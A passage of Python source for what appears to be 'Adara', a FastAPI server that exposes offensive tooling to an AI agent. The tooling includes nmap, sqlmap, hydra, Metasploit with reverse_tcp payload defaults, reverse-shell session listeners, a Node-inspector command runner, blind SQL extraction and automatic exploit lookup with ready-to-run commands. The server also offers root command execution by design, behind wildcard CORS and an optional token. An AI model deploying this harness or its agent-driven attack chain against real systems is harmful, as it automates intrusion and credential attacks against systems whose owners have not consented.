                    parts.append(f.read().decode("utf-8", errors="replace"))
                else:
                    parts.append(f.read().decode("utf-8", errors="replace"))
            return "\n...[omitted middle]...\n".join(parts)
        except FileNotFoundError:
            return ""
        except Exception as e:
            return f"[error reading log: {e}]"

    async def kill(self):
        """Terminate the whole process tree: SIGTERM → SIGKILL after 2s.
        Kills the process GROUP (shell + children like sqlmap/hydra), not just
        the shell — otherwise orphaned children keep scanning and writing logs."""
        self._alive = False
        was_running = self.proc is not None and self.proc.returncode is None
        if was_running:
            pid = self.proc.pid
            try:
                try:
                    os.killpg(os.getpgid(pid), signal.SIGTERM)
                except (ProcessLookupError, PermissionError):
                    try:
                        self.proc.terminate()
                    except ProcessLookupError:
                        pass
                try:
                    await asyncio.wait_for(self.proc.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    try:
                        os.killpg(os.getpgid(pid), signal.SIGKILL)
                    except (ProcessLookupError, PermissionError):
                        pass
                    try:
                        self.proc.kill()
                    except ProcessLookupError:
                        pass
            except Exception:
                pass
        # FIX: don't overwrite a genuine exit code with -9 — killing an
        # already-finished job used to corrupt its audit history.
        if was_running:
            await _db.finish_job(self.job_id, -9)
        logger.info(f"Job {self.job_id} killed")


# In-memory registry of active jobs (keyed by job_id)
_jobs: Dict[str, JobTracker] = {}


async def start_background_job(command: str, track: str = "",
                               env: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """Launch a detached background job and return immediately.
    Shared by the generic /api/scan/start endpoint and every tool endpoint's
    background=True branch. Never blocks the caller."""
    # FIX4: subprocess flood guard — no rate/concurrency cap existed: 500
    # scan_start calls spawned 500 live processes + logs. Cap running jobs;
    # finished trackers are pruned and the durable trail is the DB/log files.
    # NOTE: asyncio.subprocess.Process has no .poll() (that's subprocess.Popen)
    # — use .returncode (None while running) to avoid AttributeError.
    _running = sum(1 for t in _jobs.values()
                   if t.proc is not None and t.proc.returncode is None)
    if _running >= 50:
        return {
            "job_id": "", "started": False,
            "error": f"job cap reached ({_running}/50 running). "
                     "Wait for scans to finish or kill idle jobs first.",
            "message": "Running jobs: " + str(_running),
        }
    job_id = f"job_{uuid.uuid4().hex[:8]}"
    log_path = f"/tmp/adara_job_{job_id}.log"
    tracker = JobTracker(job_id, command, log_path, track)
    await tracker.start(env)
    _jobs[job_id] = tracker
    # prune finished trackers (DB + log files are the durable audit trail)
    if len(_jobs) > 100:
        for jid in list(_jobs):
            t = _jobs[jid]
            if t.proc is not None and t.proc.returncode is not None:
                del _jobs[jid]
        # sweep job logs older than 7 days
        try:
            cutoff = time.time() - 7 * 86400
            for f in Path("/tmp").glob("adara_job_*.log"):
                try:
                    if f.stat().st_mtime < cutoff:
                        f.unlink(missing_ok=True)
                except OSError:
                    pass
        except OSError:
            pass
    return {
        "job_id":     job_id,
        "log_path":   log_path,
        "pid":        tracker.pid,
        "track":      tracker.track,
        # FIX5: redact the command in the RESPONSE (in-memory tracker keeps the
        # raw string for execution; the response/DB never see creds)
        "command":    _redact(command),
        "started":    True,
        "message":    "Scan running in background. Use /api/scan/{job_id}/status to check progress.",
        "tip":        "Poll /api/scan/{job_id}/status or block with /api/scan/{job_id}/wait",
    }


# ─────────────────────────────────────────────
# FastAPI app + lifespan
# ─────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("🔪 Adara API Server starting up")
    # Pre-warm MSF console so it's ready instantly when AI needs it
    try:
        if shutil.which("msfconsole"):
            sid = "prewarm_msf"
            sess = PTYSession(sid, "msfconsole", "metasploit")
            await sess.start(["msfconsole", "-q"])
            _pty_sessions[sid] = sess
            sess.metadata["shell_type"] = "prewarm"
            logger.info("🔥 Pre-warming Metasploit console in background...")
            # Don't wait for prompt — let it load in background
    except Exception as e:
        logger.warning(f"MSF prewarm failed (non-fatal): {e}")
    # FIX13: sweep orphaned tool output files from previous runs (ffuf/nuclei
    # background jobs leave multi-MB JSON on /tmp that no code ever deletes)
    try:
        cutoff = time.time() - 86400
        for pat in ("ffuf_out_*.json", "nuclei_*.json"):
            for f in Path("/tmp").glob(pat):
                try:
                    if f.stat().st_mtime < cutoff:
                        f.unlink(missing_ok=True)
                except OSError:
                    pass
    except OSError:
        pass
    yield
    # BUG-005 FIX: Cleanup ALL sessions on shutdown (not just named ones)
    logger.info("🔪 Cleaning up all sessions...")
    for sid, sess in list(_pty_sessions.items()):
        try:
            await sess.kill()
        except Exception as e:
            logger.warning(f"Error killing PTY session {sid}: {e}")
    for sid, sess in list(_ssh_sessions.items()):
        try:
            await sess.close()
        except Exception as e:
            logger.warning(f"Error closing SSH session {sid}: {e}")
    logger.info("🔪 Adara API Server shut down")

app = FastAPI(
    title="Adara Tools API",
    description="Advanced async API for Adara Linux pentesting tools",
    version="2.0.0",
    lifespan=lifespan,
)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

if API_TOKEN:
    import hmac as _hmac

    @app.middleware("http")
    async def _require_token(request: Request, call_next):
        """Bearer-token gate on every /api/* route when ADARA_TOKEN is set.
        The endpoints are root-RCE by design (/api/command, /api/scan/start,
        ssh_upload) — on a LAN this is the only thing between a random
        scanner and a root shell.
        FIX11: constant-time compare (plain == leaked token length via
        timing); OPTIONS preflight passes so browsers can actually reach the
        CORS-approved routes."""
        if request.method == "OPTIONS":
            return await call_next(request)
        if request.url.path.startswith("/api/"):
            auth = request.headers.get("Authorization", "")
            key  = request.headers.get("X-API-Key", "")
            auth_ok = _hmac.compare_digest(auth, f"Bearer {API_TOKEN}")
            key_ok  = _hmac.compare_digest(key, API_TOKEN)
            if not (auth_ok or key_ok):
                return JSONResponse(
                    {"error": "unauthorized", "hint": "set ADARA_TOKEN on the server and send Authorization: Bearer <token>"},
                    status_code=401)
        return await call_next(request)


# ─────────────────────────────────────────────
# Pydantic request models
# ─────────────────────────────────────────────
class CommandReq(BaseModel):
    command: str
    timeout: int = CMD_TIMEOUT

class ParallelReq(BaseModel):
    commands: List[str]
    timeout: int = CMD_TIMEOUT

class NmapReq(BaseModel):
    target: str
    scan_type: str = "-sCV"
    ports: str = ""
    additional_args: str = "-T4 -Pn"
    background: bool = False          # If True, run detached via JobTracker

class FullPortScanReq(BaseModel):
    target: str
    min_rate: int = 1500              # pass-1 sweep speed (ports/sec)
    udp: bool = False                 # also sweep top-100 UDP ports
    version_scan: bool = True         # pass 2: -sCV on discovered ports
    background: bool = False          # If True, run detached via JobTracker

class GobusterReq(BaseModel):
    url: str
    mode: str = "dir"
    wordlist: str = "/usr/share/wordlists/dirb/common.txt"
    additional_args: str = "-t 30 --no-error"
    status_codes: str = ""   # explicit whitelist e.g. "200,204,301,302"
    deep: bool = False       # auto-escalate: big wordlist + extensions + recursive
    background: bool = False          # If True, run detached via JobTracker

class DirbReq(BaseModel):
    url: str
    wordlist: str = "/usr/share/wordlists/dirb/common.txt"
    additional_args: str = ""
    deep: bool = False       # auto-escalate: big wordlist + recursive + extensions

class NiktoReq(BaseModel):
    target: str
    additional_args: str = ""
    deep: bool = False       # auto-escalate: -Tuning 123bde -Display V
    background: bool = False          # If True, run detached via JobTracker

class SqlmapReq(BaseModel):
    url: str
    data: str = ""
    additional_args: str = "--batch --level=2 --risk=2"
    deep: bool = False       # auto-escalate: --level=5 --risk=3 --crawl=2 --smart
    background: bool = False          # If True, run detached via JobTracker (kills the -32001 timeout)

class MetasploitReq(BaseModel):
    module: str
    options: Dict[str, Any] = {}
    interactive: bool = False  # if True, returns session_id

class HydraReq(BaseModel):
    target: str
    service: str
    username: str = ""
    username_file: str = ""
    password: str = ""
    password_file: str = ""
    additional_args: str = ""
    background: bool = False          # If True, run detached via JobTracker

class JohnReq(BaseModel):
    hash_file: str
    wordlist: str = "/usr/share/wordlists/rockyou.txt"
    format_type: str = ""
    additional_args: str = ""

class WpscanReq(BaseModel):
    url: str
    additional_args: str = "--enumerate vp,u"
    deep: bool = False       # auto-escalate: full enumeration + aggressive plugin detection
    background: bool = False          # If True, run detached via JobTracker

class Enum4linuxReq(BaseModel):
    target: str
    additional_args: str = "-a"

class MsfRunReq(BaseModel):
    session_id: str
    module: str
    options: Dict[str, Any] = {}
    module_timeout: float = 300.0   # seconds to wait for module completion
    # Universal Metasploit fields — auto-handled by msf_run
    payload: str = ""               # e.g. 'linux/x86/meterpreter/reverse_tcp'
    lhost: str = ""                 # Auto-detected if empty (Adara's IP)
    lport: int = 0                  # Auto-assigned 4444 if empty and payload is reverse
    target_idx: Optional[int] = None  # set TARGET <N> for multi-target exploits
    action: str = ""                # set ACTION for auxiliary modules with multiple actions
    run_bg: bool = False            # Run in background ('run -j') for long-running scanners

class MsfSearchReq(BaseModel):
    session_id: str
    query: str                      # Search query e.g. 'type:exploit platform:linux ftp'

class MsfInfoReq(BaseModel):
    session_id: str
    module: str                     # Module path e.g. 'exploit/unix/ftp/vsftpd_234_backdoor'

class SessionCreateReq(BaseModel):
    type: str          # "netcat_listen" | "msfconsole" | "bash" | "socat" | "direct_shell"
    target: str = ""
    port: int = 4444
    extra_args: str = ""
    auto_stabilize: bool = False  # If True, auto-run PTY upgrade after connection

class SessionSendReq(BaseModel):
    session_id: str
    command: str
    wait_for: str = ""
    read_timeout: float = 15.0   # raised from 3.0 — MSF modules need time

class SessionReadReq(BaseModel):
    session_id: str
    timeout: float = 8.0         # raised from 2.0

class SSHConnectReq(BaseModel):
    host: str
    port: int = 22
    username: str
    password: str = ""
    key_path: str = ""

class SSHExecReq(BaseModel):
    session_id: str
    command: str
    timeout: float = 300.0

class SSHExecInteractiveReq(BaseModel):
    session_id: str
    commands: List[str]
    delay: float = 0.5

class SSHFileReq(BaseModel):
    session_id: str
    local_path: str
    remote_path: str

class SSHUploadReq(BaseModel):
    """Request model for SSH file upload -- supports both path-based and content-based."""
    session_id: str
    local_path: str = ""           # Server-local path to file (alternative to content)
    remote_path: str
    file_content_b64: str = ""     # Base64-encoded file content (alternative to local_path)
    file_name: str = ""            # Original filename when using content-based upload

class FindingReq(BaseModel):
    target: str
    tool: str
    category: str = "info"
    title: str
    detail: str = ""
    severity: str = "info"
    raw_output: str = ""
    scan_command: str = ""
    status: str = "new"

class TargetUpdateReq(BaseModel):
    host: str
    os_guess: Optional[str] = None
    open_ports: Optional[str] = None
    services: Optional[str] = None
    cves: Optional[str] = None
    open_ports_json: Optional[str] = None
    services_json: Optional[str] = None
    cves_json: Optional[str] = None
    notes: Optional[str] = None

class FindingStatusReq(BaseModel):
    finding_id: int
    status: str  # new, confirmed, false_positive, remediated

class AnalysisSaveReq(BaseModel):
    target: str
    analysis: Dict
    delta: Optional[Dict] = None

class UpgradeShellReq(BaseModel):
    session_id: str
    command: str = ""
    read_timeout: float = 5.0

class WafwooReq(BaseModel):
    url: str
    additional_args: str = ""

class FfufReq(BaseModel):
    url: str
    wordlist: str = "/usr/share/wordlists/dirb/common.txt"
    additional_args: str = "-c -t 40"
    deep: bool = False       # auto-escalate: best wordlist + -mc all -fc 404
    background: bool = False          # If True, run detached via JobTracker

class NodeInspReq(BaseModel):
    host: str = "127.0.0.1"   # inspector address (loopback on the target usually)
    port: int = 9229
    command: str = ""         # shell command to run via child_process.execSync
    expression: str = ""      # raw JS expression (overrides `command`)
    title_filter: str = ""    # pick the /json target whose title contains this
    timeout: float = 15.0

class NosqlReq(BaseModel):
    url: str                  # login endpoint (method POST unless changed)
    method: str = "POST"
    username_field: str = "username"
    password_field: str = "password"
    body_format: str = "urlencoded"   # urlencoded | json
    headers: Dict[str, str] = {}
    ok_codes: List[int] = [200, 201, 302]
    timeout: float = 15.0

class ExifReq(BaseModel):
    path: str                 # absolute path on the Adara server
    additional_args: str = "" # extra exiftool args (e.g. -a -u)

class BinwalkReq(BaseModel):
    path: str                 # file/image/firmware to scan
    extract: bool = False     # True → also run binwalk -e (carve embedded files)
    additional_args: str = ""

class ForemostReq(BaseModel):
    path: str                 # raw dump/image to carve
    out_dir: str = "/tmp/foremost_out"
    additional_args: str = "" # e.g. -t jpg,png,pdf,gif,zip

class WhatwebReq(BaseModel):
    url: str
    additional_args: str = ""  # e.g. --log-json=/tmp/ww.json

class MasscanReq(BaseModel):
    target: str                # IP, range, or CIDR (e.g. 10.0.0.0/24)
    ports: str = "1-65535"
    rate: int = 1000           # packets/sec
    additional_args: str = ""

class DnsreconReq(BaseModel):
    target: str                # domain name
    scan_type: str = "std"     # std | zone | brt (brt needs a wordlist)
    wordlist: str = "/usr/share/wordlists/dirb/common.txt"
    additional_args: str = ""

class TheHarvesterReq(BaseModel):
    domain: str
    sources: str = "all"       # all | google | bing | linkedin | ...
    limit: int = 500
    additional_args: str = ""

class CewlReq(BaseModel):
    url: str
    depth: int = 2
    min_length: int = 4
    output: str = "/tmp/cewl_wordlist.txt"
    additional_args: str = ""

class CommixReq(BaseModel):
    url: str
    data: str = ""             # POST body if injecting a POST parameter
    additional_args: str = "--batch"
    background: bool = False   # deep tests are slow — detach if True

class SearchsploitReq(BaseModel):
    query: str = ""            # free-text search term
    cve: str = ""              # CVE id (overrides query)
    additional_args: str = ""

class SmtpUserEnumReq(BaseModel):
    host: str
    port: int = 25
    username_file: str = ""    # list of usernames to probe
    usernames: str = ""        # comma-separated inline usernames
    additional_args: str = ""

class DavtestReq(BaseModel):
    url: str
    directory: str = ""        # WebDAV directory
    additional_args: str = ""

class SteghideReq(BaseModel):
    file: str                  # carrier file on the Adara box
    action: str = "extract"    # extract | info
    password: str = ""         # stego passphrase (extract)
    output: str = ""           # extract destination (default: alongside file)
    additional_args: str = ""  # e.g. --extract-format

class CurlReq(BaseModel):
    url: str
    method: str = "GET"
    headers: Dict[str, str] = {}
    data: str = ""
    additional_args: str = "-sk"
    encode_url: bool = False   # If True, percent-encode unsafe chars in path/query (preserves already-encoded %xx)

class MultiCurlReq(BaseModel):
    requests: List[CurlReq]

class CrackMapExecReq(BaseModel):
    target: str
    service: str = "smb"
    username: str = ""
    password: str = ""
    deep: bool = False       # auto-escalate: --shares --users --pass-pol
    additional_args: str = ""

class NetcatConnectReq(BaseModel):
    host: str
    port: int
    data_to_send: str = ""
    timeout: float = 10.0   # raised from 5.0 — some banners need more time

class NucleiReq(BaseModel):
    target: str                       # Target URL, IP, or CIDR
    templates: str = ""               # Template IDs or paths (comma-separated)
    severity: str = ""                # Filter: info,low,medium,high,critical
    tags: str = ""                    # Template tags (comma-separated)
    template_dir: str = ""            # Custom template directory
    rate_limit: int = 150             # Requests per second
    concurrency: int = 25             # Concurrent templates
    timeout_secs: int = 10            # Per-request timeout
    additional_args: str = ""         # Extra nuclei flags
    scan_type: str = ""               # Shorthand: 'full', 'cves', 'misconfig', 'exposure', 'dns'
    background: bool = False          # If True, run detached via JobTracker (no 300s timeout)


# ─────────────────────────────────────────────
# Background scan job request models
# ─────────────────────────────────────────────
class ScanStartReq(BaseModel):
    command: str
    track: str = ""          # tool hint for progress parsing (auto-detected if empty)
    env: Dict[str, str] = {} # extra environment vars for the command

class ScanWaitReq(BaseModel):
    timeout: int = 60          # max seconds to wait
    poll_interval: int = 2     # seconds between status polls
    tail_bytes: int = 4096     # log tail size in final result


class BlindExtractReq(BaseModel):
    url: str
    payload_template: str              # must contain {pos} and {val}; {sleep} auto-filled
    sleep: float = 0.5                 # SLEEP seconds injected by the payload
    start_pos: int = 1
    end_pos: int = 32
    char_min: int = 32
    char_max: int = 126
    method: str = "GET"                # GET or POST
    headers: Dict[str, str] = {}
    data: str = ""                     # extra POST body (merged with rendered payload)
    concurrency: int = 4               # parallel positions
    length_payload: str = ""           # if set, binary-search length first (overrides end_pos)
    max_len: int = 256
    true_threshold: float = 1.5        # elapsed >= sleep*true_threshold => condition true
    max_retries: int = 2
    request_timeout: float = 30.0      # per HTTP request timeout
    stop_on_no_trigger: bool = True    # stop at first position that never triggers (past EOS)


class TemplateSaveReq(BaseModel):
    name: str
    method: str = "GET"
    url: str = ""
    headers: Dict[str, str] = {}
    data: str = ""
    additional_args: str = "-sk"


class TemplateRunReq(BaseModel):
    url: Optional[str] = None
    method: Optional[str] = None
    headers: Optional[Dict[str, str]] = None
    data: Optional[str] = None
    additional_args: Optional[str] = None
    encode_url: bool = False


# ─────────────────────────────────────────────
# Helper — ORJson response
# ─────────────────────────────────────────────
def ojson(data) -> Response:
    """FIX: serialize directly with orjson — the old json.loads/orjson round
    trip double-serialized multi-MB payloads and crashed on non-string keys."""
    return Response(content=orjson.dumps(data), media_type="application/json")


# ─────────────────────────────────────────────
# Health
# ─────────────────────────────────────────────
@app.get("/health")
async def health_check():
    """BUG-010 FIX: Use shutil.which() instead of spawning 17 subprocesses."""
    tools = ["nmap","gobuster","dirb","nikto","sqlmap","hydra","john",
             "wpscan","enum4linux","msfconsole","nc","curl","ffuf",
             "wafw00f","crackmapexec","socat","smbclient","nuclei"]
    status = {t: shutil.which(t) is not None for t in tools}
    return ojson({
        "status": "healthy",
        "tools_status": status,
        "all_essential_tools_available": all(status[t] for t in ["nmap","gobuster","nikto","nc","curl"]),
        "active_pty_sessions":  len(_pty_sessions),
        "active_ssh_sessions":  len(_ssh_sessions),
        "db_path": DB_PATH,
        "cve_enrichment_available": _HAS_CVE_ENRICHMENT,
        "endpoints": ["/api/poc/search", "/api/cve/lookup", "/api/poc/bulk"] if _HAS_CVE_ENRICHMENT else [],
    })


# ─────────────────────────────────────────────
# Generic command
# ─────────────────────────────────────────────
@app.post("/api/command")
async def generic_command(req: CommandReq):
    result = await run_command(req.command, req.timeout)
    # window giant outputs — a 100k-line run would destroy the agent's context;
    # the full log stays retrievable via scan_start/scan_output
    w = _window_output(result.get("stdout", ""), pre_stripped=True)
    if w["truncated"]:
        result = {**result, "stdout": w["text"], "stdout_truncated": True,
                  "stdout_len": w["len"], "omitted_chars": w["omitted"]}
    # Auto-CVE/PoC enrichment for raw scanner executions (FIX M3): ANY
    # command that can leak service/version fingerprints (nmap, wpscan,
    # curl banners, nikto, MSF batch...) gets the same CVE+PoC lookup.
    if _SCAN_CMD_RE.search(req.command) and (result.get("stdout") or result.get("stderr")):
        try:
            hub = _guess_target_generic(req.command)
            if hub:
                enrich = await _enrich_stdout(
                    hub, "execute_command(auto-CVE+POC hook)",
                    (result.get("stdout") or "") + "\n" + (result.get("stderr") or ""))
                if enrich:
                    result = {**result, **enrich}
        except Exception as e:
            logger.debug(f"auto-CVE enrichment skipped: {e}")
    return ojson(result)


# ─────────────────────────────────────────────
# Parallel commands — THE KEY FEATURE
# Runs all commands simultaneously, waits for all
# ─────────────────────────────────────────────
def _window_output(text: str, head: int = 60000, tail: int = 30000,
                   pre_stripped: bool = False) -> Dict:
    """Window a very large output: keep head+tail, mark the omitted middle.
    The agent keeps parse-critical context without flooding its context
    window; the full output remains in the DB / job log file (scan_output)."""
    if not pre_stripped:
        text = _strip_ansi(text)  # FIX: skip re-stripping already-clean output
    if len(text) <= head + tail:
        return {"text": text, "truncated": False, "omitted": 0, "len": len(text)}
    omitted = len(text) - head - tail
    marker = (f"\n…[OMITTED {omitted} chars — page the full log via "
              f"scan_output() / /api/scan/<job_id>/output]…\n")
    return {"text": text[:head] + marker + text[-tail:],
            "truncated": True, "omitted": omitted, "len": len(text)}


@app.post("/api/parallel")
async def parallel_commands(req: ParallelReq):
    """Run multiple commands simultaneously. Returns all results when ALL complete.
    BUG-013 FIX: Add proper cancellation on timeout."""
    if not req.commands:
        raise HTTPException(400, "No commands provided")
    logger.info(f"Parallel execution: {len(req.commands)} commands")
    start = time.monotonic()

    tasks = [asyncio.create_task(run_command(cmd, req.timeout)) for cmd in req.commands]
    try:
        results = await asyncio.wait_for(
            asyncio.gather(*tasks, return_exceptions=True),
            # FIX: each run_command already enforces req.timeout itself, so the
            # gather just needs a small grace window for their cleanup paths.
            timeout=req.timeout + 5
        )
    except asyncio.TimeoutError:
        # Cancel all still-running tasks
        for t in tasks:
            if not t.done():
                t.cancel()
        # FIX: await the cancelled tasks — run_command's BaseException handler
        # group-kills and reaps its process; skipping this leaked processes and
        # raised "Task was destroyed but it is pending" warnings.
        await asyncio.gather(*tasks, return_exceptions=True)
        # Collect whatever results we have so far
        results = []
        for t in tasks:
            if t.done() and not t.cancelled():
                try:
                    results.append(t.result())
                except Exception:
                    results.append({"stdout": "", "stderr": "Cancelled", "success": False, "timed_out": True, "elapsed_sec": 0})
            else:
                results.append({"stdout": "", "stderr": "Cancelled due to timeout", "success": False, "timed_out": True, "elapsed_sec": 0})

    elapsed = round(time.monotonic() - start, 2)
    # Convert exceptions to error dicts
    safe_results = []
    for i, res in enumerate(results):
        if isinstance(res, Exception):
            safe_results.append({"stdout": "", "stderr": str(res), "success": False, "timed_out": False, "elapsed_sec": 0})
        else:
            # FIX: window each output so N parallel runs can't collectively
            # flood the agent's context window (keeps head+tail per command)
            w = _window_output(res.get("stdout", ""), pre_stripped=True)
            if w["truncated"]:
                res = {**res, "stdout": w["text"], "stdout_truncated": True,
                       "stdout_len": w["len"], "omitted_chars": w["omitted"]}
            # Auto-CVE/PoC enrichment for each scan leg (FIX M3) — any
            # command that leaks service/version (nmap, wpscan, banners, MSF
            # batch...) gets the same CVE/PoC hook as the dedicated tools.
            cmd = req.commands[i] if i < len(req.commands) else ""
            if _SCAN_CMD_RE.search(cmd):
                try:
                    hub = _guess_target_generic(cmd)
                    if hub:
                        enrich = await _enrich_stdout(
                            hub, "parallel_scan(auto-CVE+POC hook)",
                            (res.get("stdout") or "") + "\n" + (res.get("stderr") or ""))
                        if enrich:
                            res = {**res, **enrich}
                except Exception as e:
                    logger.debug(f"auto-CVE enrichment skipped: {e}")
            safe_results.append(res)

    return ojson({
        "results": [
            {"command": cmd, **res}
            for cmd, res in zip(req.commands, safe_results)
        ],
        "total_elapsed_sec": elapsed,
        "count": len(req.commands),
    })


# ─────────────────────────────────────────────
# Tool endpoints — all async
# ─────────────────────────────────────────────
@app.post("/api/tools/nmap")
async def nmap(req: NmapReq):
    import shlex
    cmd = f"nmap {req.scan_type}"
    if req.ports:
        cmd += f" -p {shlex.quote(req.ports)}"
    if req.additional_args:
        cmd += f" {req.additional_args}"
    cmd += f" {shlex.quote(req.target)}"
    if req.background:
        return ojson(await start_background_job(cmd, track="nmap"))
    result = await _run_or_background(cmd, track="nmap")
    if result.get("auto_backgrounded"):
        return ojson(result)
    # Auto-save to DB
    if result["stdout"]:
        await _db.save_finding(req.target, "nmap", "scan", "Nmap scan", raw_output=result["stdout"], scan_command=_redact(cmd))
        # Parse open ports for target profile — whitespace-tolerant now
        ports = _ports_from_nmap_text(result["stdout"])
        # FIX (TestSprite TC004): expose the parsed ports IN the response —
        # they used to only go to the target DB profile, so the API returned no
        # structured ports field for consumers.
        result["parsed_ports"] = [
            {"port": f"{p[0]}/{p[1]}", "service": p[2]} for p in ports
        ]
        result["ports_total"] = len(ports)
        if ports:
            port_str = ", ".join(f"{p[0]}/{p[1]} ({p[2]})" for p in ports)
            port_json = json.dumps([{"port": f"{p[0]}/{p[1]}", "service": p[2]}
                                    for p in ports])
            await _db.update_target(req.target, open_ports=port_str, open_ports_json=port_json)
        os_match = re.search(r'OS details?:\s*(.+)', result["stdout"])
        if os_match:
            await _db.update_target(req.target, os_guess=os_match.group(1).strip())
        # Auto-CVE/PoC enrichment (FIX M3): any open SERVICE with a version
        # (e.g. 'Unbound 1.23.0') gets CVE lookup + PoC lookup automatically.
        try:
            enrichment = await _enrich_stdout(
                req.target, "nmap(auto-CVE+POC hook)", result["stdout"])
            if enrichment:
                result.update(enrichment)
        except Exception as e:
            logger.debug(f"auto-CVE enrichment skipped: {e}")
    return ojson(result)

def _parse_nmap_xml(xml_text: str) -> Dict:
    """Parse nmap -oX - output into a compact structured dict.
    Returns open ports with service/version/CPE, OS guess, and trimmed
    NSE script output — the raw XML can be hundreds of KB, so every
    field is capped to keep the agent context lean.
    FIX (M3): on ET.ParseError the XML is usually a mangled/single-line-per-
    entry log where tabs/newlines sit inside tags — fall back to the
    whitespace-normalizing regex parser (never returns the empty list the old
    regex returned). ET itself is whitespace-tolerant for VALID XML."""
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return {"open_ports": _ports_from_nmap_xml_text(xml_text),
                "os_guess": "", "from_regex_fallback": True}
    ports = []
    os_guess = ""
    for host in root.findall(".//host"):
        os_matches = host.findall(".//osmatch")
        if os_matches and not os_guess:
            os_guess = os_matches[0].get("name", "")[:80]
        for port in host.findall(".//port"):
            state = port.find("state")
            if state is None or state.get("state") != "open":
                continue
            svc = port.find("service")
            scripts = []
            for script in port.findall("script")[:3]:
                out = (script.get("output") or "")[:200]
                scripts.append({"id": script.get("id", ""), "output": out})
            ports.append({
                # FIX9: poisoned/malformed XML (portid="abc") crashed the
                # whole parse — the top-level ET.ParseError guard never fired
                "port": int(port.get("portid", "0") or 0) if (port.get("portid") or "").isdigit() else 0,
                "proto": port.get("protocol", "tcp"),
                "service": svc.get("name", "") if svc is not None else "",
                "product": svc.get("product", "") if svc is not None else "",
                "version": svc.get("version", "") if svc is not None else "",
                "cpe": svc.get("cpe", "") if svc is not None else "",
                "scripts": scripts,
            })
    ports.sort(key=lambda p: p["port"])
    return {"open_ports": ports, "os_guess": os_guess}

# ─────────────────────────────────────────────
# Auto-CVE lookup for detected service versions (FIX M3)
# When a scan confirms a product+version (e.g. 'Unbound 1.23.0' on the .1
# router) we look the CVEs up automatically instead of requiring a separate
# search_service_cves call. Best-effort: per-service cache, 8s lookup cap,
# at most MAX_SERVICES external queries per scan.
# ─────────────────────────────────────────────
_cve_svc_cache: Dict[str, List[Dict[str, Any]]] = {}


async def _service_cve_lookup(product: str, version: str,
                              max_results: int = 3) -> List[Dict[str, Any]]:
    if not (product and version):
        return []
    key = f"{product.strip().lower()}%%{version.strip().lower()}"
    if key in _cve_svc_cache:
        return _cve_svc_cache[key]
    try:
        from cve_enrichment import search_service_cves_all
    except ImportError:
        _cve_svc_cache[key] = []
        return []
    try:
        res = await asyncio.wait_for(
            search_service_cves_all(product, version, max_results=max_results),
            timeout=20.0)
        seen: List[str] = []
        cves: List[Dict[str, Any]] = []
        for it in (res.get("vulners") or []) + (res.get("nvd") or []):
            cid = str(it.get("cve_id") or "")
            if not cid or cid in seen:
                continue
            seen.append(cid)
            sev = (it.get("severity") or it.get("cvss_severity") or "")
            cvss = it.get("cvss")
            if cvss is None:
                cvss = it.get("cvss_score")
            cves.append({
                "cve_id":   cid,
                "severity": str(sev),
                "cvss":     cvss,
            })
            if len(cves) >= max_results:
                break
        if not cves:
            cves = [{"cve_id": cid} for cid in (res.get("unique_cves") or [])][:max_results]
        _cve_svc_cache[key] = cves
        return cves
    except (asyncio.TimeoutError, Exception):
        _cve_svc_cache[key] = []
        return []


async def _auto_cve_for_services(services, max_services: int = 4) -> Dict[str, Any]:
    """Enrich a scanned service list with matching CVEs (product+version only).
    Bound: at most `max_services` distinct lookups, each capped at 8s."""
    groups: List[Dict[str, Any]] = []
    seen = set()
    for s in (services or []):
        prod = str(s.get("product") or "").strip()
        ver  = str(s.get("version") or "").strip()
        if not prod or not ver:
            continue
        key = f"{prod.lower()}%%{ver.lower()}"
        if key in seen:
            continue
        seen.add(key)
        if len(groups) >= max_services:
            break
        groups.append({"product": prod, "version": ver,
                       "port": s.get("port"), "service": s.get("service", "")})
    if not groups:
        return {"cves_by_service": [], "unique_cves_total": 0, "unique_cves": []}
    lists = await asyncio.gather(
        *[_service_cve_lookup(g["product"], g["version"]) for g in groups],
        return_exceptions=True)
    by_service: List[Dict[str, Any]] = []
    unique: List[str] = []
    for i, g in enumerate(groups):
        cvs = lists[i] if isinstance(lists[i], list) else []
        by_service.append({**g, "cves": cvs})
        for c in cvs:
            if c.get("cve_id") and c["cve_id"] not in unique:
                unique.append(c["cve_id"])
    return {"cves_by_service": by_service, "unique_cves_total": len(unique),
            "unique_cves": unique}


# ─────────────────────────────────────────────
# Auto-PoC lookup for top detected CVEs (FIX M3)
# When the version scan finds CVEs we ALSO look the PoCs up automatically
# (multi-source: nomi-sec / ycdxsb / trickest / GitHub search / sploitus +
# ready-to-run metasploit/exploitdb/nuclei commands + vulhub docker), so a
# finding never stops at an ID. Best-effort, cached per CVE, 15s cap each.
# ─────────────────────────────────────────────
_poc_cache: Dict[str, Dict[str, Any]] = {}


async def _poc_lookup(cve_id: str) -> Dict[str, Any]:
    """Compact PoC-enriched info for one CVE (top repos + deployable commands)."""
    cve_id = (cve_id or "").upper().strip()
    if not cve_id.startswith("CVE-"):
        cve_id = f"CVE-{cve_id}"
    if cve_id in _poc_cache:
        return _poc_cache[cve_id]
    if not _HAS_CVE_ENRICHMENT:
        _poc_cache[cve_id] = {"cve_id": cve_id, "error": "enrichment unavailable"}
        return _poc_cache[cve_id]
    from cve_enrichment import lookup_poc_all
    try:
        res = await asyncio.wait_for(lookup_poc_all(cve_id), timeout=15.0)
        if not isinstance(res, dict):
            res = {}
        repos = res.get("all_repos") or []
        compact = {
            "cve_id":       cve_id,
            "total_repos":  res.get("total_repos", len(repos)),
            "top_repos": [
                {"full_name": r.get("full_name", ""),
                 "html_url": r.get("html_url", ""),
                 "stars": r.get("stars", 0),
                 "language": r.get("language") or "",
                 "description": (str(r.get("description") or ""))[:140]}
                for r in repos[:5]
            ],
            "run_commands": res.get("run_commands") or {},
        }
        _poc_cache[cve_id] = compact
        return compact
    except Exception as e:  # covers asyncio.TimeoutError + network errors
        _poc_cache[cve_id] = {"cve_id": cve_id, "error": f"poc lookup failed: {e}"}
        return _poc_cache[cve_id]


async def _auto_poc_for_cves(cve_list: List[Dict[str, Any]],
                             cap: int = 3) -> Dict[str, Any]:
    """Enrich a list of {cve_id, cvss} with PoC data, highest-CVSS first.
    Bound: at most `cap` distinct lookups, run concurrently, 15s each."""
    seen: List[str] = []
    picked: List[Dict[str, Any]] = []
